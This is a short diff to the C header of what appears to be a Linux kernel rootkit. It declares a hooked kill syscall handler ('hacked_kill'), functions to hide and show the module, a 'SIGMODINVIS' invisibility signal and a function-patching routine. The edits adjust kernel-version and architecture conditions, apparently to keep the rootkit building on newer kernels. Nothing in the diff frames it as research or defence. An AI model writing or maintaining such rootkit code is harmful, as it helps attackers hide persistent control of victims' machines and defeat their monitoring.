@@ -1,3 +1,7 @@
+/* IS_ENABLED is used only in preprocessor conditions and has been expanded to
+   defined(...) directly in the kernel module source. */
+
+
 unsigned long
 resolve_sym(char *symbol);
 
@@ -18,8 +22,8 @@ module_show(void);
 void
 module_hide(void);
 
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-asmlinkage long
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0) && defined(CONFIG_ARCH_HAS_SYSCALL_WRAPPER)
+long
 hacked_kill(const struct pt_regs *pt_regs);
 #else
 asmlinkage long
@@ -45,12 +49,7 @@ enum {
 	SIGMODINVIS = 63
 };
 
-#ifndef IS_ENABLED
-#define IS_ENABLED(option) \
-(defined(__enabled_ ## option) || defined(__enabled_ ## option ## _MODULE))
-#endif
-
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0) && (IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64))
+#if defined(CONFIG_X86) || defined(CONFIG_X86_64)
 #define DUMP_SIZE 0x5000
 void
 flipswitch_func(void *target_func, void *hacked_func);
